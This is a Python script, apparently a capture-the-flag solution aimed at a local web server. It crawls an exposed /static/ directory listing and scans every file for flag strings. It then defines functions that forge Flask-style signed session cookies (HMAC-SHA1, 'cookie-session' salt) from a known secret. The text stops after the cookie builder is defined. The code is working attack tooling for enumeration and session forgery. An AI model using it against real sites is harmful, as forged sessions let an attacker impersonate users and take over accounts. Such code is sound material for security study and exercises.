import re, urllib.request, urllib.parse
from html.parser import HTMLParser

base = 'http://localhost:80/static/'
visited_dirs = set()
files = []

class LinkParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.links = []
    def handle_starttag(self, tag, attrs):
        if tag.lower() == 'a':
            href = dict(attrs).get('href')
            if href:
                self.links.append(href)

def fetch(url):
    with urllib.request.urlopen(url) as r:
        return r.read().decode('utf-8', 'ignore')

def crawl_dir(url):
    if url in visited_dirs:
        return
    visited_dirs.add(url)
    html = fetch(url)
    p = LinkParser(); p.feed(html)
    for href in p.links:
        if href in ('../', '/static/', '/', 'Parent Directory'):
            continue
        # Build absolute
        abs_url = urllib.parse.urljoin(url, href)
        if href.endswith('/'):
            crawl_dir(abs_url)
        else:
            files.append(abs_url)

crawl_dir(base)
print('TOTAL FILES', len(files))

# Fetch and scan
pat = re.compile(r'FLAG\{[^}]*\}|FLAG[^\n]*', re.I)
for f in files:
    try:
        data = urllib.request.urlopen(f).read().decode('utf-8', 'ignore')
        m = pat.search(data)
        if m:
            print('HIT', f, '->', m.group(0))
    except Exception as e:
        pass

import base64, hmac, hashlib, json, time, urllib.request

BASE = 'http://localhost:80'

def b64e(b):
    return base64.urlsafe_b64encode(b).decode().rstrip('=')

def ts_bytes(ts=None):
    if ts is None:
        ts = int(time.time())
    return ts.to_bytes(4, 'big')

# Signer with concat or hmac derivation

def derive_key(secret: bytes, salt: bytes, method: str, digest):
    if method == 'concat':
        return salt + secret
    elif method == 'hmac':
        return hmac.new(secret, salt, digest).digest()
    else:
        raise ValueError('bad method')

def sign_value(key: bytes, value: bytes, digest):
    sig = hmac.new(key, value, digest).digest()
    return b64e(sig)

# Build session cookie value

def make_cookie(data, secret, salt='cookie-session', digest=hashlib.sha1, deriv='concat'):
    payload = b64e(json.dumps(data, separators=(',',':')).encode())
    ts = b64e(ts_bytes())
    value = (payload + '.' + ts).encode()
    key = derive_key(secret.encode(), salt.encode(), deriv, digest)
    sig = sign_value(key, value, digest)
    return payload + '.' + ts + '.' + sig

